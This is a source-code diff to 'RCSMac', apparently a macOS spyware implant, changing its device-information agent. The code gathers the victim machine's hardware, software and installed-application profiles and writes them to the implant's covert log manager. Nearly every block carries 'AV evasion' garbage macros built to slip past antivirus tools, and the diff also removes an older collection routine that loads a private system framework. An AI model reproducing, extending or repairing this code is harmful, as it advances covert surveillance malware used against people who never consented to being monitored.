@@ -3,6 +3,7 @@
 //  RCSMac
 //
 //  Created by kiodo on 3/11/11.
+//  Modified by J on 2014
 //  Copyright 2011 __MyCompanyName__. All rights reserved.
 //
 #import <dlfcn.h>
@@ -95,60 +96,52 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
 
 - (BOOL)getDeviceInfo
 {
-    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
     // AV evasion: only on release build
     AV_GARBAGE_000
  
-    NSData *infoData = nil;
-    
-    /*
     if (gOSMajor >= 10 && gOSMinor >= 6)
-    {*/
-        // osx >= 10.9
-    NSMutableData *infoSys = (NSMutableData*)[self getSystemProfilerInfo:@"SPSoftwareDataType"];
-    NSMutableData *infoHw = (NSMutableData*)[self getSystemProfilerInfo:@"SPHardwareDataType"];
-    NSMutableData *infoApp = (NSMutableData*)[self getSystemProfilerInfo:@"SPApplicationsDataType"];
-    NSMutableData *tmpData = [[NSMutableData alloc]init];
-    if (tmpData != nil)
     {
-        [tmpData appendData:infoHw];
-        [tmpData appendData:infoSys];
-        NSString *appString = @" Applications:\n\n";
-        [tmpData appendData:[appString dataUsingEncoding:NSUTF8StringEncoding]];
-        [tmpData appendData:infoApp];
-    }
-    infoData = [[NSData alloc ]initWithData:tmpData];
-    [tmpData release];
-    [infoSys release];
-    [infoHw release];
-    [infoApp release];
-    if (infoData !=nil)
-    {
-        [self writeProfilerInfo: infoData];
-    }
-    /*}
-    else
-    {
-        // the old good way
-        infoData = [self getSystemInfoWithType: kSPHardwareDataType];
+        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+
+        NSData *infoData = nil;
+    
+        NSMutableData *infoSys = (NSMutableData*)[self getSystemProfilerInfo:@"SPSoftwareDataType"];
+        NSMutableData *infoHw = (NSMutableData*)[self getSystemProfilerInfo:@"SPHardwareDataType"];
+        NSMutableData *infoApp = (NSMutableData*)[self getSystemProfilerInfo:@"SPApplicationsDataType"];
+        NSMutableData *tmpData = [[NSMutableData alloc]init];
+        if (tmpData != nil)
+        {
+            [tmpData appendData:infoHw];
+            [tmpData appendData:infoSys];
+            NSString *appString = @" Applications:\n\n";
+            [tmpData appendData:[appString dataUsingEncoding:NSUTF8StringEncoding]];
+            [tmpData appendData:infoApp];
+        }
+        infoData = [[NSData alloc ]initWithData:tmpData];
+        [tmpData release];
+        [infoSys release];
+        [infoHw release];
+        [infoApp release];
         if (infoData !=nil)
         {
-            [self writeDeviceInfo: infoData];
+            [self writeProfilerInfo: infoData];
         }
-    }*/
-    
-    // AV evasion: only on release build
-    AV_GARBAGE_005
+
+        // AV evasion: only on release build
+        AV_GARBAGE_005
   
-    [infoData release];
+        [infoData release];
+        [pool release];
+        return YES;
+    }
+    else
+    {
+        // AV evasion: only on release build
+        AV_GARBAGE_002
   
-    // AV evasion: only on release build
-    AV_GARBAGE_002
-  
-    [pool release];
-  
-    return YES;
+        return NO;
+    }
 }
 
 - (BOOL) filterOut:(NSString *)aPath
@@ -203,8 +196,6 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
                 format: nil
                 errorDescription: &errorDesc];
     
-    tmpString = [[NSMutableString alloc] init];
-    
     // AV evasion: only on release build
     AV_GARBAGE_006
     
@@ -215,6 +206,8 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
         [pool release];
         return nil;
     }
+    
+    tmpString = [[NSMutableString alloc] init];
     
     // AV evasion: only on release build
     AV_GARBAGE_006
@@ -301,7 +294,8 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
     // AV evasion: only on release build
     AV_GARBAGE_002
     
-    aFilename = [[NSString alloc] initWithFormat: @"/tmp/29t0502zz%.8d.XXXX", randTime];
+    //aFilename = [[NSString alloc] initWithFormat: @"/tmp/29t0502zz%.8d.XXXX", randTime];
+    aFilename = [[NSString alloc] initWithFormat: @"/tmp/29t0502zz%.8ld.XXXX", randTime];
     
     // AV evasion: only on release build
     AV_GARBAGE_006
@@ -427,194 +421,6 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
     return resultData;
 }
 
-- (NSData*)getSystemInfoWithType: (NSString*)aType
-{
-  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_000
-  
-  NSData *retData = nil;
-  NSString *systemInfoStrHw = nil;
-  NSMutableString *systemInfoStr = nil;
-  NSDictionary *hwDict;
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_001
-  
-  void *handle = dlopen("/System/Library/PrivateFrameworks/SPSupport.framework/Versions/Current/SPSupport", 2);
-  
-  if (handle == NULL)
-  {
-    [pool release];
-    return nil;
-  }
-  
-  id SPDocumentClass = nil;
-  
-  SPDocumentClass = objc_getClass("SPDocument");
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_002
-  
-  if (SPDocumentClass == nil) 
-  {   
-    // AV evasion: only on release build
-    AV_GARBAGE_004
-    
-    [pool release];
-    return nil;
-  }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_008
-  
-  id sp = [[SPDocumentClass alloc] init];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_007
-  
-  if (sp == nil) 
-  {   
-    // AV evasion: only on release build
-    AV_GARBAGE_001
-    
-    [pool release];
-    return nil;
-  }
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_002
-  
-  // Setting detail level
-  if ([sp respondsToSelector: @selector(setDetailLevel:)])
-    [sp performSelector: @selector(setDetailLevel:)
-             withObject: (id)1];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_003
-  
-  if ([sp respondsToSelector: @selector(reportForDataType:)])
-    hwDict = (NSDictionary*)[sp performSelector: @selector(reportForDataType:)
-                                     withObject: aType];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_004
-  
-  if (hwDict != nil)
-  {
-    NSArray *items = [hwDict objectForKey: @"_items"];
-    
-    // AV evasion: only on release build
-    AV_GARBAGE_006
-    
-    if (items != nil)
-    {   
-      // AV evasion: only on release build
-      AV_GARBAGE_006
-      
-      if ([sp respondsToSelector: @selector(stringForItem:dataType:)])
-      {   
-        // AV evasion: only on release build
-        AV_GARBAGE_009
-  
-        systemInfoStrHw = (NSString*)[sp performSelector: @selector(stringForItem:dataType:)
-                                            withObject: hwDict
-                                            withObject: aType];
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_007
-        
-        if (systemInfoStrHw != nil)
-        {   
-          // AV evasion: only on release build
-          AV_GARBAGE_001
-          
-          systemInfoStr = [NSMutableString stringWithFormat:@"\nSoftware:\nMacOS version: %u.%u.%u\n\n",
-                                                            gOSMajor, gOSMinor, gOSBugFix];
-          [systemInfoStr appendString: systemInfoStrHw];
-          
-          retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_002
-          
-        }
-      }
-    }
-    
-    // AV evasion: only on release build
-    AV_GARBAGE_006
-    
-  }
-  
-  [pool release];
-  
-  // AV evasion: only on release build
-  AV_GARBAGE_002
-  
-  return retData;
-}
-
-
-- (BOOL)writeDeviceInfo: (NSData*)aInfo
-{
-  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
-  
-  NSString *tmpUTF16Info = nil;
-  
-  if (aInfo == nil)
-  {
-    [pool release];
-    return NO;
-  }
-  
-  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
-  
-  BOOL success = [logManager createLog: LOGTYPE_DEVICE
-                           agentHeader: nil
-                             withLogID: 0];
-  
-  if (success == TRUE)
-  {
-
-    tmpUTF16Info = [[NSString alloc]initWithData: aInfo
-                                        encoding: NSUTF16LittleEndianStringEncoding];
-
-    if (tmpUTF16Info == nil)
-      tmpUTF16Info =  [[NSString alloc] initWithFormat: @"%@", @"no information"];
-  
-    NSMutableData *tmpData = 
-    (NSMutableData*)[tmpUTF16Info dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-
-    [tmpUTF16Info release];
-    
-    if (tmpData == nil) 
-    {
-      NSString *nullInfo = [[NSString alloc] initWithFormat: @"%@", @"no information"];
-      tmpData = (NSMutableData*)[nullInfo dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-      [nullInfo release];
-    }
-    
-    [logManager writeDataToLog: tmpData
-                      forAgent: LOGTYPE_DEVICE
-                     withLogID: 0];
-    
-    [logManager closeActiveLog: LOGTYPE_DEVICE
-                     withLogID: 0];
-  }
-  else
-  {
-//#ifdef DEBUG_DEVICE
-//    NSLog(@"%s: error creating logs", __FUNCTION__);
-//#endif
-  }
-  
-  [pool release];
-  
-  return YES;
-}
-
 - (BOOL)writeProfilerInfo: (NSData*)aInfo
 {
     NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
@@ -662,19 +468,19 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
 
 - (BOOL)stop
 {
-  int internalCounter = 0;
+    int internalCounter = 0;
   
-  [mAgentConfiguration setObject: AGENT_STOP
+    [mAgentConfiguration setObject: AGENT_STOP
                           forKey: @"status"];
   
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
+    while (![[mAgentConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED]
          && internalCounter <= MAX_STOP_WAIT_TIME)
-  {
-    internalCounter++;
-    usleep(100000);
-  }
+    {
+        internalCounter++;
+        usleep(100000);
+    }
   
-  return YES;
+    return YES;
 }
 
 - (void)start
@@ -683,15 +489,15 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
     infoLog(@"module device started");
 #endif
     
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
+    [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
-  [self getDeviceInfo];
+    [self getDeviceInfo];
   
-  [mAgentConfiguration setObject: AGENT_STOPPED
-                          forKey: @"status"];
-  [outerPool release];
+    [mAgentConfiguration setObject: AGENT_STOPPED
+                            forKey: @"status"];
+    [outerPool release];
 }
 
 - (BOOL)resume
